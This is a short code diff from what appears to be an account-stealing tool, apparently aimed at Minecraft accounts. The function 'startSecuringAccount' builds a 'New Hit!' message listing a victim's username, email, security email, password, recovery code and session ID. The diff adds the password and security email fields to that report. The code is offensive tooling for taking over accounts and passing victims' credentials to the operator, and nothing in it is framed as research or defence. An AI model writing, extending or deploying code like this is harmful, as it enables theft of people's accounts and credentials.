@@ -22,11 +22,13 @@ def startSecuringAccount(email: str, device: str = None, code: str = None):
         title = f"New Hit!"
     )
 
-    # To replace oldEmail -> Email
-    hit_embed.add_field(name = "Username:\n", value = f"```{account["oldName"]}```")
-    hit_embed.add_field(name = "Email:\n", value = f"```{account["oldEmail"]}```")
+    # To replace oldEmail -> Email (New Alias)
+    hit_embed.add_field(name = "Username:\n", value = f"```{account["oldName"]}```\n")
     hit_embed.add_field(name = "Method:\n", value = f"```{account["method"]}```")
-    hit_embed.add_field(name = "Capes:\n", value = f"```{account["capes"]}```")
+    hit_embed.add_field(name = "Capes:\n", value = f"```{account["capes"]}```\n")
+    hit_embed.add_field(name = "Email:\n", value = f"```{account["oldEmail"]}```")
+    hit_embed.add_field(name = "Security Email:\n", value = f"```{account["secEmail"]}```\n")
+    hit_embed.add_field(name = "Password:\n", value = f"```{account["password"]}```\n")
     hit_embed.add_field(name = "Recovery Code:\n", value = f"```{account["recoveryCode"]}```")
 
     if account["SSID"] != "Failed to Get":
